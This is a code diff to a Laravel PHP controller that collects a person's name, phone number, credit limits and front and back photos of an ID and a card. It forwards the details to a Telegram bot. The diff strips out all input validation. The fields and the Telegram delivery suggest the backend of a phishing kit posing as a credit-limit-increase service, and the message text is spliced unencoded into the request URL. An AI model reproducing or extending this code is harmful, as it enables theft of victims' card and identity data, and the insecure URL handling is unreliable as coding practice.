@@ -9,37 +9,7 @@ class OtpController extends Controller
 {
     public function save(Request $request)
     {
-        $request->validate([
-            'name' => 'required',
-            'phone' => 'required',
-            'limit_now' => 'required',
-            'limit_total' => 'required',
-            'mattruoc' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
-            'matsau' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
-            'mattruoc_card' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
-            'matsau_card' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
-        ], [
-            'name.required' => 'Vui lòng nhập tên khách hàng',
-            'phone.required' => 'Vui lòng nhập số điện thoại',
-            'limit_now.required' => 'Vui lòng nhập giới hạn hiện tại',
-            'limit_total.required' => 'Vui lòng nhập giới hạn tối đa',
-            'mattruoc.required' => 'Vui lòng chọn ảnh mặt trước',
-            'matsau.required' => 'Vui lòng chọn ảnh mặt sau',
-            'mattruoc_card.required' => 'Vui lòng chọn ảnh mặt trước thẻ',
-            'matsau_card.required' => 'Vui lòng chọn ảnh mặt sau thẻ',
-            'mattruoc.image' => 'Ảnh mặt trước không đúng định dạng',
-            'matsau.image' => 'Ảnh mặt sau không đúng định dạng',
-            'mattruoc_card.image' => 'Ảnh mặt trước thẻ không đúng định dạng',
-            'matsau_card.image' => 'Ảnh mặt sau thẻ không đúng định dạng',
-            'mattruoc.mimes' => 'Ảnh mặt trước không đúng định dạng',
-            'matsau.mimes' => 'Ảnh mặt sau không đúng định dạng',
-            'mattruoc_card.mimes' => 'Ảnh mặt trước thẻ không đúng định dạng',
-            'matsau_card.mimes' => 'Ảnh mặt sau thẻ không đúng định dạng',
-            'mattruoc.max' => 'Ảnh mặt trước không quá 2MB',
-            'matsau.max' => 'Ảnh mặt sau không quá 2MB',
-            'mattruoc_card.max' => 'Ảnh mặt trước thẻ không quá 2MB',
-            'matsau_card.max' => 'Ảnh mặt sau thẻ không quá 2MB',
-        ]);
+       
         // loop imageIds save to storage
         // save image
         $mattruoc_name = '';
@@ -80,7 +50,6 @@ class OtpController extends Controller
         $message .= " <b>Giới hạn tăng:</b> " . $request->limit_increase . "\n";
 
         $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendMessage?chat_id=" . env('TELEGRAM_CHAT_ID') . "&text=" . $message . "&parse_mode=HTML";
-
 
         file_get_contents($url);
 
